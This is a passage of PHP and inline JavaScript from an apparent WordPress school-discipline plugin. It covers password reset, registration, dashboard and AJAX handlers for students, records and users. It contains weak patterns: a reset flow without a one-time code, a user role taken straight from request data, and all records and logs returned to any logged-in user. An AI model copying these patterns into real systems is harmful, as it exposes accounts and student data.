                    eessShowForgotMsg(\'يرجى اختيار الجنسية المسجلة.\', true);
                    return;
                }
            } else if (nextStep === 6) {
                const role = document.getElementById(\'eess-forgot-role\').value;
                if (!role) {
                    eessShowForgotMsg(\'يرجى اختيار الرتبة الوظيفية.\', true);
                    return;
                }
            } else if (nextStep === 7) {
                if (eessCheckRoleSubjectNeed()) {
                    const subj = document.getElementById(\'eess-forgot-subject\').value;
                    if (!subj) {
                        eessShowForgotMsg(\'يرجى تحديد المادة الدراسية المسندة لك.\', true);
                        return;
                    }
                }
            }

            eessGoToForgotStep(nextStep);
        }

        function eessPrevForgotStep(prevStep) {
            document.getElementById(\'eess-forgot-msg\').style.display = \'none\';
            if (prevStep === 6 && !eessCheckRoleSubjectNeed()) {
                prevStep = 5;
            }
            eessGoToForgotStep(prevStep);
        }

        // Complete Verification Without OTP
        function eessVerifyIdentityFull() {
            const dob = document.getElementById(\'eess-forgot-dob\').value;
            if (!dob) {
                eessShowForgotMsg(\'يرجى اختيار تاريخ الميلاد المسجل بالنظام.\', true);
                return;
            }

            const btn = document.getElementById(\'btn-verify-identity\');
            btn.disabled = true;
            btn.innerText = \'جاري التحقق الأمني...\';

            const data = new FormData();
            data.append(\'action\', \'eess_forgot_verify_identity\');
            data.append(\'email\', document.getElementById(\'eess-forgot-email\').value.trim());
            data.append(\'emp_id\', document.getElementById(\'eess-forgot-empid\').value.trim());
            data.append(\'institution\', document.getElementById(\'eess-forgot-institution\').value);
            data.append(\'nationality\', document.getElementById(\'eess-forgot-nationality\').value);
            data.append(\'role\', document.getElementById(\'eess-forgot-role\').value);
            data.append(\'subject\', document.getElementById(\'eess-forgot-subject\').value);
            data.append(\'dob\', dob);

            fetch(\'' . admin_url('admin-ajax.php') . '\', { method: \'POST\', body: data })
            .then(res => res.json())
            .then(res => {
                btn.disabled = false;
                btn.innerText = \'التحقق الأمني من الهوية ←\';

                if (res.success) {
                    eessVerifiedResetToken = res.data.reset_token;
                    document.getElementById(\'eess-forgot-welcome-msg\').innerText = \'أهلاً بك يا \' + res.data.display_name + \'!\';
                    eessGoToForgotStep(8);
                } else {
                    eessShowForgotMsg(res.data, true);
                }
            });
        }

        // Live Password Rules Check
        function eessLiveCheckPassword() {
            const pass = document.getElementById(\'eess-forgot-pass\').value;

            const lenOk = pass.length >= 8 && pass.length <= 40;
            const upperOk = /[A-Z]/.test(pass);
            const lowerOk = /[a-z]/.test(pass);
            const numOk = /[0-9]/.test(pass);

            document.getElementById(\'pwd-rule-len\').style.color = lenOk ? \'#16a34a\' : \'#64748b\';
            document.getElementById(\'pwd-rule-len\').innerText = (lenOk ? \'✓ \' : \'• \') + \'الطول بين 8 و 40 خانة\';

            document.getElementById(\'pwd-rule-upper\').style.color = upperOk ? \'#16a34a\' : \'#64748b\';
            document.getElementById(\'pwd-rule-upper\').innerText = (upperOk ? \'✓ \' : \'• \') + \'حرف إنجليزي كبير (A-Z) واحد على الأقل\';

            document.getElementById(\'pwd-rule-lower\').style.color = lowerOk ? \'#16a34a\' : \'#64748b\';
            document.getElementById(\'pwd-rule-lower\').innerText = (lowerOk ? \'✓ \' : \'• \') + \'حرف إنجليزي صغير (a-z) واحد على الأقل\';

            document.getElementById(\'pwd-rule-num\').style.color = numOk ? \'#16a34a\' : \'#64748b\';
            document.getElementById(\'pwd-rule-num\').innerText = (numOk ? \'✓ \' : \'• \') + \'رقم (0-9) واحد على الأقل\';
        }

        // Set Password & Auto-login
        function eessSetNewPasswordAndLogin() {
            const pass = document.getElementById(\'eess-forgot-pass\').value;
            const conf = document.getElementById(\'eess-forgot-pass-conf\').value;

            if (!pass || !conf) {
                eessShowForgotMsg(\'يرجى كتابة كلمة المرور وتأكيدها.\', true);
                return;
            }

            if (pass !== conf) {
                eessShowForgotMsg(\'كلمتا المرور غير متطابقتين.\', true);
                return;
            }

            const btn = document.getElementById(\'btn-save-new-pass\');
            btn.disabled = true;
            btn.innerText = \'جاري الحفظ وتوثيق الدخول...\';

            const data = new FormData();
            data.append(\'action\', \'eess_forgot_set_password\');
            data.append(\'reset_token\', eessVerifiedResetToken);
            data.append(\'password\', pass);
            data.append(\'password_conf\', conf);

            fetch(\'' . admin_url('admin-ajax.php') . '\', { method: \'POST\', body: data })
            .then(res => res.json())
            .then(res => {
                if (res.success) {
                    eessShowForgotMsg(res.data.message || \'تم الحفظ وتوثيق دخولك بنجاح!\', false);
                    setTimeout(() => {
                        window.location.href = res.data.redirect_url || \'' . home_url('/sm-admin') . '\';
                    }, 1000);
                } else {
                    btn.disabled = false;
                    btn.innerText = \'حفظ كلمة المرور والدخول المباشر للنظام\';
                    eessShowForgotMsg(res.data, true);
                }
            });
        }

        // Password Visibility Toggle
        function eessTogglePassVisibility(inputId, btn) {
            const input = document.getElementById(inputId);
            if (!input) return;
            if (input.type === \'password\') {
                input.type = \'text\';
                btn.style.color = \'#000000\';
            } else {
                input.type = \'password\';
                btn.style.color = \'#64748b\';
            }
        }

        function eessOnRegRoleChange() {
            const role = document.getElementById(\'eess-reg-role\').value;
            const subBox = document.getElementById(\'eess-reg-subject-box\');
            if (role === \'sm_teacher\' || role === \'sm_coordinator\' || role === \'sm_hod\') {
                subBox.style.display = \'block\';
            } else {
                subBox.style.display = \'none\';
            }
        }

        // Registration Wizard navigation
        function eessGoToRegStep(stepNum) {
            document.getElementById(\'eess-register-msg\').style.display = \'none\';

            // Validation per step
            if (stepNum > 1) {
                const fn = document.getElementById(\'eess-reg-first-name\').value.trim();
                const ln = document.getElementById(\'eess-reg-last-name\').value.trim();
                const dob = document.getElementById(\'eess-reg-dob\').value;
                const nat = document.getElementById(\'eess-reg-nationality\').value;
                if (!fn || !ln || !dob || !nat) {
                    eessShowRegMsg(\'يرجى تعبئة كافة حقول البيانات الشخصية (الاسم، الميلاد، الجنسية).\', true);
                    return;
                }
            }

            if (stepNum > 2) {
                const email = document.getElementById(\'eess-reg-email\').value.trim();
                const phone = document.getElementById(\'eess-reg-phone\').value.trim();
                if (!email || !email.includes(\'@\') || !phone) {
                    eessShowRegMsg(\'يرجى كتابة بريد إلكتروني صحيح ورقم الهاتف.\', true);
                    return;
                }
            }

            if (stepNum > 3) {
                const empNum = document.getElementById(\'eess-reg-emp-num\').value.trim();
                const inst = document.getElementById(\'eess-reg-institution\').value;
                if (!empNum || !inst) {
                    eessShowRegMsg(\'يرجى كتابة الرقم الوظيفي واختيار المؤسسة/المدرسة.\', true);
                    return;
                }
            }

            if (stepNum > 4) {
                const role = document.getElementById(\'eess-reg-role\').value;
                const subj = document.getElementById(\'eess-reg-subject\').value;
                if (!role) {
                    eessShowRegMsg(\'يرجى اختيار الرتبة الوظيفية.\', true);
                    return;
                }
                if ((role === \'sm_teacher\' || role === \'sm_coordinator\' || role === \'sm_hod\') && !subj) {
                    eessShowRegMsg(\'يرجى تحديد المادة الدراسية المسندة.\', true);
                    return;
                }
            }

            // Update Summary on Step 5
            if (stepNum === 5) {
                const fn = document.getElementById(\'eess-reg-first-name\').value.trim();
                const ln = document.getElementById(\'eess-reg-last-name\').value.trim();
                const email = document.getElementById(\'eess-reg-email\').value.trim();
                const empNum = document.getElementById(\'eess-reg-emp-num\').value.trim();
                const inst = document.getElementById(\'eess-reg-institution\').value;
                const roleText = document.getElementById(\'eess-reg-role\').options[document.getElementById(\'eess-reg-role\').selectedIndex].text;
                const subj = document.getElementById(\'eess-reg-subject\').value;

                document.getElementById(\'eess-reg-summary-card\').innerHTML = `
                    <div><strong>الاسم الكامل:</strong> ${fn} ${ln}</div>
                    <div><strong>البريد الإلكتروني:</strong> ${email}</div>
                    <div><strong>الرقم الوظيفي:</strong> ${empNum}</div>
                    <div><strong>المؤسسة/المدرسة:</strong> ${inst}</div>
                    <div><strong>الرتبة الوظيفية:</strong> ${roleText} ${subj ? \' (مادة: \' + subj + \')\' : \'\'}</div>
                `;
            }

            for (let i = 1; i <= 5; i++) {
                document.getElementById(\'eess-reg-step-\' + i).className = i === stepNum ? \'eess-wizard-step active\' : \'eess-wizard-step\';

                const node = document.getElementById(\'node-\' + i);
                if (node) {
                    node.className = \'eess-step-node\';
                    if (i === stepNum) {
                        node.classList.add(\'active\');
                    } else if (i < stepNum) {
                        node.classList.add(\'completed\');
                        node.innerText = \'✓\';
                    } else {
                        node.innerText = i;
                    }
                }
            }
        }

        // Final Submit
        function eessRegisterSubmitFinal() {
            const firstName = document.getElementById(\'eess-reg-first-name\').value.trim();
            const lastName = document.getElementById(\'eess-reg-last-name\').value.trim();
            const dob = document.getElementById(\'eess-reg-dob\').value;
            const nationality = document.getElementById(\'eess-reg-nationality\').value;
            const email = document.getElementById(\'eess-reg-email\').value.trim();
            const phone = document.getElementById(\'eess-reg-phone\').value.trim();
            const empNum = document.getElementById(\'eess-reg-emp-num\').value.trim();
            const institution = document.getElementById(\'eess-reg-institution\').value;
            const role = document.getElementById(\'eess-reg-role\').value;
            const subject = document.getElementById(\'eess-reg-subject\').value;
            const pass = document.getElementById(\'eess-reg-pass\').value;
            const conf = document.getElementById(\'eess-reg-pass-conf\').value;

            if (!pass || !conf) {
                eessShowRegMsg(\'يرجى كتابة كلمة المرور وتأكيدها.\', true);
                return;
            }
            if (pass !== conf) {
                eessShowRegMsg(\'كلمتا المرور غير متطابقتين.\', true);
                return;
            }

            const btn = document.getElementById(\'btn-submit-reg-final\');
            btn.disabled = true;
            btn.innerText = \'جاري إرسال طلب التسجيل...\';

            const data = new FormData();
            data.append(\'action\', \'eess_register_submit\');
            data.append(\'first_name\', firstName);
            data.append(\'last_name\', lastName);
            data.append(\'dob\', dob);
            data.append(\'nationality\', nationality);
            data.append(\'email\', email);
            data.append(\'phone\', phone);
            data.append(\'emp_num\', empNum);
            data.append(\'institution\', institution);
            data.append(\'school\', institution);
            data.append(\'role\', role);
            data.append(\'subject\', subject);
            data.append(\'password\', pass);
            data.append(\'password_conf\', conf);

            fetch(\'' . admin_url('admin-ajax.php') . '\', { method: \'POST\', body: data })
            .then(res => res.json())
            .then(res => {
                if (res.success) {
                    eessShowRegMsg(res.data || \'تم إرسال طلب التسجيل بنجاح، وهو الآن قيد مراجعة وإعتماد الإدارة.\', false);
                    setTimeout(() => {
                        eessCloseRegisterModal();
                        location.reload();
                    }, 2500);
                } else {
                    btn.disabled = false;
                    btn.innerText = \'إرسال طلب التسجيل للإدارة\';
                    eessShowRegMsg(res.data, true);
                }
            })
            .catch(err => {
                btn.disabled = false;
                btn.innerText = \'إرسال طلب التسجيل للإدارة\';
                eessShowRegMsg(\'حدث خطأ أثناء الاتصال بالخادم.\', true);
            });
        }
        </script>
        ';
        return $output;
    }


    public function shortcode_admin_dashboard() {
        if (!is_user_logged_in()) {
            return $this->shortcode_login();
        }

        if ($this->eess_is_mobile_device()) {
            return $this->eess_render_mobile_lesson_prep();
        }

        $user = wp_get_current_user();
        $roles = (array) $user->roles;
        $active_tab = isset($_GET['sm_tab']) ? sanitize_text_field($_GET['sm_tab']) : 'summary';

        $is_admin = in_array('administrator', $roles) || current_user_can('manage_options');

        // Centralized security & visibility control check for active tab
        if (!$is_admin) {
            $is_allowed = SM_Settings::is_section_visible($active_tab) && SM_Settings::user_has_module_capability($active_tab);
            if (!$is_allowed) {
                return SM_Settings::get_access_restricted_html();
            }
        }

        // Data Preparation based on tab
        $is_sys_admin = in_array('sm_system_admin', $roles);
        $is_principal = in_array('sm_principal', $roles);
        $is_supervisor = in_array('sm_supervisor', $roles);
        $is_coordinator = in_array('sm_coordinator', $roles);
        $is_teacher = in_array('sm_teacher', $roles);
        $is_student = in_array('sm_student', $roles);
        $is_parent = in_array('sm_parent', $roles);

        // Security / Capability check for tabs - synchronize with Central Sidebar Section Visibility
        if (!$is_admin && !SM_Settings::is_section_visible($active_tab)) {
            $active_tab = 'summary';
        }

        // Fetch data based on tab
        switch ($active_tab) {
            case 'summary':
                if ($is_student) {
                    $student = SM_DB::get_student_by_parent($user->ID);
                    $student_id = $student ? $student->id : 0;
                    $stats = SM_DB::get_student_stats($student_id);
                    $student_assignments = SM_DB::get_assignments($user->ID);

                    // Find assigned supervisor
                    $supervisor = null;
                    if ($student) {
                        $supervisors = get_users(array('role' => 'sm_supervisor'));
                        foreach ($supervisors as $s) {
                            $supervised = get_user_meta($s->ID, 'sm_supervised_classes', true);
                            if (is_array($supervised) && in_array($student->class_name . '|' . $student->section, $supervised)) {
                                $supervisor = $s;
                                break;
                            }
                        }
                    }
                } else {
                    $stats = SM_DB::get_statistics($is_teacher && !$is_admin ? ['teacher_id' => $user->ID] : []);
                }
                break;

            case 'students':
                $args = array();
                if (isset($_GET['student_search'])) $args['search'] = sanitize_text_field($_GET['student_search']);
                if (isset($_GET['class_filter'])) $args['class_name'] = sanitize_text_field($_GET['class_filter']);
                if (isset($_GET['section_filter'])) $args['section'] = sanitize_text_field($_GET['section_filter']);
                if (isset($_GET['teacher_filter']) && !empty($_GET['teacher_filter'])) $args['teacher_id'] = intval($_GET['teacher_filter']);
                if ($is_teacher && !$is_admin) $args['teacher_id'] = $user->ID;
                $students = SM_DB::get_students($args);
                break;

            case 'stats':
                $filters = array();
                if ($is_parent || $is_student) {
                    $my_stu = SM_DB::get_students_by_parent($user->ID);
                    $filters['student_id'] = isset($_GET['student_id']) ? intval($_GET['student_id']) : ($my_stu[0]->id ?? 0);
                } else {
                    if (isset($_GET['student_filter'])) $filters['student_id'] = intval($_GET['student_filter']);
                    if ($is_teacher && !$is_admin) $filters['teacher_id'] = $user->ID;

                    if (isset($_GET['class_filter'])) $filters['class_name'] = sanitize_text_field($_GET['class_filter']);
                    if (isset($_GET['section_filter'])) $filters['section'] = sanitize_text_field($_GET['section_filter']);
                    if (isset($_GET['student_search'])) $filters['search'] = sanitize_text_field($_GET['student_search']);
                }
                if (isset($_GET['start_date'])) $filters['start_date'] = sanitize_text_field($_GET['start_date']);
                if (isset($_GET['end_date'])) $filters['end_date'] = sanitize_text_field($_GET['end_date']);
                if (isset($_GET['type_filter'])) $filters['type'] = sanitize_text_field($_GET['type_filter']);

                // If no filters are applied, limit to latest 20 for quick access
                $is_filtering = !empty($_GET['student_search']) || !empty($_GET['class_filter']) || !empty($_GET['section_filter']) || !empty($_GET['start_date']) || !empty($_GET['end_date']) || !empty($_GET['type_filter']);
                if (!$is_filtering && !$is_parent) {
                    $filters['limit'] = 20;
                }

                $records = SM_DB::get_records($filters);
                break;

            case 'reports':
                $stats = SM_DB::get_statistics();
                $records = SM_DB::get_records();
                break;

            case 'teacher-reports':
                $records = SM_DB::get_records(array('status' => 'pending'));
                break;

            case 'confiscated':
                $records = SM_DB::get_confiscated_items();
                break;

            case 'attendance':
                $attendance_date = isset($_GET['attendance_date']) ? sanitize_text_field($_GET['attendance_date']) : current_time('Y-m-d');
                $attendance_summary = SM_DB::get_attendance_summary($attendance_date);
                break;
        }

        ob_start();
        include SM_PLUGIN_DIR . 'templates/public-admin-panel.php';
        return ob_get_clean();
    }

    public function login_failed($username) {
        SM_Logger::log('فشل تسجيل الدخول', "محاولة دخول فاشلة للمستخدم: $username");
        $referrer = wp_get_referer();
        if ($referrer && !strstr($referrer, 'wp-login') && !strstr($referrer, 'wp-admin')) {
            wp_redirect(add_query_arg('login', 'failed', $referrer));
            exit;
        }
    }

    public function log_successful_login($user_login, $user) {
        SM_Logger::log('تسجيل دخول ناجح', "المستخدم: $user_login (ID: {$user->ID})");
    }

    public function ajax_get_student() {
        if (!is_user_logged_in() || !current_user_can('تسجيل_مخالفة')) wp_send_json_error('Unauthorized');
        $code = sanitize_text_field($_POST['code']);
        $student = SM_DB::get_student_by_code($code);
        if ($student) {
            wp_send_json_success($student);
        } else {
            wp_send_json_error('Student not found');
        }
    }

    public function ajax_search_students() {
        if (!is_user_logged_in() || !current_user_can('تسجيل_مخالفة')) wp_send_json_error('Unauthorized');
        $query = sanitize_text_field($_POST['query']);
        if (strlen($query) < 2) wp_send_json_success(array());

        $args = array('search' => $query);
        // Teachers can search all students as per new requirements
        $students = SM_DB::get_students($args);
        wp_send_json_success($students);
    }

    public function ajax_get_student_intelligence() {
        if (!is_user_logged_in() || !current_user_can('تسجيل_مخالفة')) wp_send_json_error('Unauthorized');
        $student_id = intval($_POST['student_id']);
        if (!$student_id) wp_send_json_error('Invalid ID');

        $stats = SM_DB::get_student_stats($student_id);
        $records = SM_DB::get_records(array('student_id' => $student_id));
        $latest = array_slice($records, 0, 3); // Get 3 latest records
        $student = SM_DB::get_student_by_id($student_id);

        $actions = SM_Settings::get_disciplinary_actions();
        $last_action_index = 0;
        if (!empty($stats['last_action'])) {
            $last_action_index = array_search($stats['last_action'], $actions);
            if ($last_action_index === false) $last_action_index = 0;
        }

        wp_send_json_success(array(
            'stats' => $stats,
            'recent' => $latest,
            'labels' => SM_Settings::get_violation_types(),
            'disciplinary_actions' => $actions,
            'last_action_index' => (int)$last_action_index,
            'is_admin' => current_user_can('manage_options') || current_user_can('إدارة_النظام'),
            'photo_url' => $student ? $student->photo_url : ''
        ));
    }

    public function ajax_refresh_dashboard() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        
        $stats = SM_DB::get_statistics();
        $records = SM_DB::get_records();
        $logs = SM_Logger::get_logs(50);
        
        wp_send_json_success(array(
            'stats' => $stats,
            'records' => $records,
            'logs' => $logs,
            'unread_messages' => 0,
            'violation_labels' => SM_Settings::get_violation_types(),
            'severity_labels' => SM_Settings::get_severities()
        ));
    }

    public function ajax_save_record() {
        if (!is_user_logged_in() || (!current_user_can('تسجيل_مخالفة') && !current_user_can('manage_options'))) {
            wp_send_json_error('عفواً، لا تملك الصلاحية لتسجيل المخالفات.');
        }
        if (!wp_verify_nonce($_POST['sm_nonce'] ?? '', 'sm_record_action')) {
            wp_send_json_error('فشل التوثيق الأمني للجلسة.');
        }

        $raw_student_ids = sanitize_text_field($_POST['student_ids'] ?? '');
        $student_ids = array_filter(array_map('intval', explode(',', $raw_student_ids)));

        if (empty($student_ids)) {
            wp_send_json_error('يرجى تحديد طالب واحد على الأقل.');
        }

        global $wpdb;
        $wpdb->query('START TRANSACTION');

        $last_record_id = 0;
        $count = 0;
        
        foreach ($student_ids as $sid) {
            $data = $_POST;
            $data['student_id'] = $sid;
            $rid = SM_DB::add_record($data, true); // Skip individual logs
            if ($rid) {
                $last_record_id = $rid;
                $count++;
                if (class_exists('SM_Notifications')) {
                    SM_Notifications::send_violation_alert($rid);
                }
            }
        }

        if ($count > 0) {
            $wpdb->query('COMMIT');
            SM_Logger::log('تسجيل مخالفة جماعية', "تم تسجيل مخالفة لعدد ($count) من الطلاب بنجاح.");
            wp_send_json_success(array(
                'count' => $count,
                'record_id' => $last_record_id,
                'message' => "تم تسجيل المخالفة بنجاح لـ ($count) من الطلاب المحددين.",
                'print_url' => admin_url('admin-ajax.php?action=sm_print&print_type=single_violation&record_id=' . $last_record_id)
            ));
        } else {
            $wpdb->query('ROLLBACK');
            wp_send_json_error('تعذر تسجيل المخالفة بقاعدة البيانات.');
        }
    }

    public function ajax_update_student_photo() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['sm_photo_nonce'], 'sm_photo_action')) wp_send_json_error('Security check failed');
        
        $user_id = get_current_user_id();
        $student_id = intval($_POST['student_id']);
        
        // Security: Parent can only update their children, Admin can update anyone
        if (!current_user_can('إدارة_الطلاب')) {
            $my_children = SM_DB::get_students_by_parent($user_id);
            $is_mine = false;
            foreach ($my_children as $child) {
                if ($child->id == $student_id) $is_mine = true;
            }
            if (!$is_mine) wp_send_json_error('Permission denied');
        }

        if (empty($_FILES['student_photo'])) wp_send_json_error('No file provided');

        require_once(ABSPATH . 'wp-admin/includes/file.php');
        require_once(ABSPATH . 'wp-admin/includes/image.php');
        require_once(ABSPATH . 'wp-admin/includes/media.php');

        $attachment_id = media_handle_upload('student_photo', 0);
        if (is_wp_error($attachment_id)) {
            wp_send_json_error($attachment_id->get_error_message());
        }

        $photo_url = wp_get_attachment_url($attachment_id);
        $student_id = intval($_POST['student_id']);
        
        SM_DB::update_student_photo($student_id, $photo_url);
        wp_send_json_success(array('photo_url' => $photo_url));
    }



    public function ajax_update_record_status() {
        if (!is_user_logged_in() || !current_user_can('إدارة_المخالفات')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_record_action')) wp_send_json_error('Security check');

        $record_id = intval($_POST['record_id']);
        $status = sanitize_text_field($_POST['status']);

        if (SM_DB::update_record_status($record_id, $status)) {
            wp_send_json_success('Status updated');
        } else {
            wp_send_json_error('Failed to update status');
        }
    }


    public function ajax_add_student() {
        $user_roles = (array) wp_get_current_user()->roles;
        $can_manage_students = current_user_can('إدارة_الطلاب') || current_user_can('manage_options') || current_user_can('manage_students') || in_array('sm_principal', $user_roles) || in_array('sm_discipline_supervisor', $user_roles);
        if (!$can_manage_students) wp_send_json_error('Unauthorized');
        $nonce = $_POST['sm_nonce'] ?? ($_POST['nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_add_student') && !wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'eess_admin_action')) wp_send_json_error('Security check failed');

        $saved_id = EESS_Student_Data_Service::process_and_save_student($_POST);
        if (is_wp_error($saved_id)) {
            wp_send_json_error($saved_id->get_error_message());
        } else {
            wp_send_json_success($saved_id);
        }
    }

    public function ajax_update_student() {
        $user_roles = (array) wp_get_current_user()->roles;
        $can_manage_students = current_user_can('إدارة_الطلاب') || current_user_can('manage_options') || current_user_can('manage_students') || in_array('sm_principal', $user_roles) || in_array('sm_discipline_supervisor', $user_roles);
        if (!$can_manage_students) wp_send_json_error('Unauthorized');
        $nonce = $_POST['sm_nonce'] ?? ($_POST['nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_add_student') && !wp_verify_nonce($nonce, 'sm_photo_action') && !wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'eess_admin_action')) wp_send_json_error('Security check failed');

        $student_id = intval($_POST['student_id'] ?? ($_POST['id'] ?? 0));
        if ($student_id > 0) {
            $user_scope = EESS_Org_Helper::get_user_scope();
            if (!$user_scope['unrestricted']) {
                global $wpdb;
                $st_sch = $wpdb->get_var($wpdb->prepare("SELECT school_id FROM {$wpdb->prefix}sm_students WHERE id = %d", $student_id));
                if ($st_sch && !in_array(intval($st_sch), $user_scope['schools'], true)) {
                    wp_send_json_error('عفواً، لا تملك صلاحية تعديل بيانات طلاب من مدرسة أخرى.');
                }
            }
        }

        $saved_id = EESS_Student_Data_Service::process_and_save_student($_POST);
        if (is_wp_error($saved_id)) {
            wp_send_json_error($saved_id->get_error_message());
        } else {
            wp_send_json_success($saved_id);
        }
    }

    public function ajax_delete_student() {
        $user_roles = (array) wp_get_current_user()->roles;
        $can_manage_students = current_user_can('إدارة_الطلاب') || current_user_can('manage_options') || current_user_can('manage_students') || in_array('sm_principal', $user_roles) || in_array('sm_discipline_supervisor', $user_roles);
        if (!$can_manage_students) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_delete_student')) wp_send_json_error('Security check failed');

        $student_id = intval($_POST['student_id']);
        $student = SM_DB::get_student_by_id($student_id);

        if ($student && SM_DB::delete_student($student_id)) {
            SM_Logger::log('حذف طالب', "تم حذف الطالب: {$student->name} (كود: {$student->student_code})");
            wp_send_json_success('Deleted');
        } else {
            wp_send_json_error('Failed to delete');
        }
    }


    public function ajax_delete_record() {
        if (!current_user_can('إدارة_المخالفات')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_record_action')) wp_send_json_error('Security check failed');

        $record_id = intval($_POST['record_id']);
        $record = SM_DB::get_record_by_id($record_id);

        if ($record && SM_DB::delete_record($record_id)) {
            SM_Logger::log('حذف مخالفة', "تم حذف مخالفة ID: $record_id للطالب ID: {$record->student_id}");
            wp_send_json_success('Deleted');
        } else {
            wp_send_json_error('Failed to delete');
        }
    }

    public function ajax_get_counts() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        wp_send_json_success(array(
            'pending_reports' => intval(SM_DB::get_pending_reports_count()),
            'expired_items' => intval(SM_DB::get_expired_items_count())
        ));
    }

    public function ajax_add_parent() {
        if (!current_user_can('إدارة_المستخدمين')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['sm_nonce'], 'sm_user_action')) wp_send_json_error('Security check failed');

        $raw_uname = $_POST['user_login'] ?? ($_POST['employee_number'] ?? ($_POST['employee_id'] ?? ($_POST['username'] ?? '')));
        $username = sanitize_user($raw_uname);
        $email = sanitize_email($_POST['user_email']);
        if (empty($email)) $email = $username . '@parent.local';

        $user_id = wp_insert_user(array(
            'user_login' => $username,
            'user_email' => $email,
            'display_name' => sanitize_text_field($_POST['display_name']),
            'user_pass' => $_POST['user_pass'],
            'role' => 'sm_parent'
        ));

        if (is_wp_error($user_id)) wp_send_json_error($user_id->get_error_message());
        else {
            SM_Logger::log('إضافة ولي أمر', "تم إنشاء حساب ولي أمر جديد: {$_POST['display_name']}");
            wp_send_json_success($user_id);
        }
    }

    public function ajax_add_user() {
        if (!current_user_can('إدارة_المستخدمين')) wp_send_json_error('Unauthorized');
        $nonce = $_POST['sm_nonce'] ?? ($_POST['nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_user_action') && !wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'sm_teacher_action')) wp_send_json_error('Security check failed');

        $username = sanitize_user($_POST['user_login']);
        $email = (!empty($_POST['user_email']) && is_email($_POST['user_email'])) ? sanitize_email($_POST['user_email']) : ($username . '@school-system.local');

        $user_data = array(
            'user_login' => $username,
            'user_email' => $email,
            'display_name' => sanitize_text_field($_POST['display_name']),
            'user_pass' => $_POST['user_pass'],
            'role' => sanitize_text_field($_POST['user_role'])
        );
        $user_id = wp_insert_user($user_data);
        if (is_wp_error($user_id)) wp_send_json_error($user_id->get_error_message());
        else {
            if (!empty($_POST['specialization'])) {
                update_user_meta($user_id, 'sm_specialization', sanitize_text_field($_POST['specialization']));
            }
            $emp_num = sanitize_text_field($_POST['employee_number'] ?? '');
            if (empty($emp_num) && class_exists('EESS_ID_Code_Service')) {
                $inst_id = !empty($_POST['institution_id']) ? intval($_POST['institution_id']) : 1;
                $emp_num = EESS_ID_Code_Service::generate_employee_code($inst_id);
            }
            if (!empty($emp_num)) {
                update_user_meta($user_id, 'eess_employee_number', $emp_num);
            }
            if (isset($_POST['department'])) {
                update_user_meta($user_id, 'eess_department', sanitize_text_field($_POST['department']));
            }
            if (isset($_POST['appointment_year'])) {
                $app_yr = intval($_POST['appointment_year']);
                if ($app_yr >= 1970 && $app_yr <= intval(date('Y'))) {
                    update_user_meta($user_id, 'eess_appointment_year', $app_yr);
                    update_user_meta($user_id, 'sm_appointment_year', $app_yr);
                }
            }

            $inst_id = !empty($_POST['institution_id']) ? intval($_POST['institution_id']) : (!empty($_POST['institution']) ? intval($_POST['institution']) : 0);
            if ($inst_id > 0) {
                global $wpdb;
                $inst_name = $wpdb->get_var($wpdb->prepare("SELECT name FROM {$wpdb->prefix}eess_institutions WHERE id = %d", $inst_id));
                if ($inst_name) {
                    update_user_meta($user_id, 'eess_school_name', $inst_name);
                    update_user_meta($user_id, 'eess_institution_id', $inst_id);
                    $wpdb->delete("{$wpdb->prefix}eess_user_assignments", array('user_id' => $user_id));
                    $wpdb->insert("{$wpdb->prefix}eess_user_assignments", array(
                        'user_id' => $user_id,
                        'institution_id' => $inst_id,
                        'school_id' => null
                    ));
                }
            }

            if (!empty($_FILES['profile_photo']['name'])) {
                require_once(ABSPATH . 'wp-admin/includes/file.php');
                require_once(ABSPATH . 'wp-admin/includes/image.php');
                require_once(ABSPATH . 'wp-admin/includes/media.php');

                $attachment_id = media_handle_upload('profile_photo', 0);
                if (!is_wp_error($attachment_id)) {
                    $photo_url = wp_get_attachment_url($attachment_id);
                    update_user_meta($user_id, 'eess_profile_photo', $photo_url);
                }
            }
            clean_user_cache($user_id);
            wp_cache_flush();
            SM_Logger::log('إضافة مستخدم جديد', "تم إنشاء مستخدم باسم: {$_POST['display_name']} ورتبة: {$_POST['user_role']}");
            wp_send_json_success($user_id);
        }
    }

    public function ajax_hr_add_employee() {
        $user = wp_get_current_user();
        $roles = (array) $user->roles;
        $is_admin = in_array('administrator', $roles) || current_user_can('manage_options');
        $is_sys_admin = in_array('sm_system_admin', $roles);
        $is_hr = in_array('sm_hr', $roles) || current_user_can('manage_hr');

        if (!$is_admin && !$is_sys_admin && !$is_hr) {
            wp_send_json_error('غير مصرح لك بالوصول.');
        }

        if (!wp_verify_nonce($_POST['sm_nonce'], 'eess_hr_add_employee_nonce')) {
            wp_send_json_error('انتهت صلاحية الجلسة، يرجى تحديث الصفحة.');
        }

        $username = sanitize_user($_POST['user_login']);
        $email = (!empty($_POST['user_email']) && is_email($_POST['user_email'])) ? sanitize_email($_POST['user_email']) : ($username . '@school-system.local');

        if (username_exists($username)) {
            wp_send_json_error('اسم المستخدم مسجل مسبقاً في النظام.');
        }

        if (email_exists($email)) {
            wp_send_json_error('البريد الإلكتروني مسجل مسبقاً في النظام.');
        }

        $user_data = array(
            'user_login' => $username,
            'user_email' => $email,
            'display_name' => sanitize_text_field($_POST['display_name']),
            'user_pass' => $_POST['user_pass'],
            'role' => sanitize_text_field($_POST['user_role'])
        );

        $user_id = wp_insert_user($user_data);
        if (is_wp_error($user_id)) {
            wp_send_json_error($user_id->get_error_message());
        }

        // Save as pending!
        update_user_meta($user_id, 'eess_approval_status', 'pending');
        update_user_meta($user_id, 'eess_employee_number', sanitize_text_field($_POST['employee_number']));
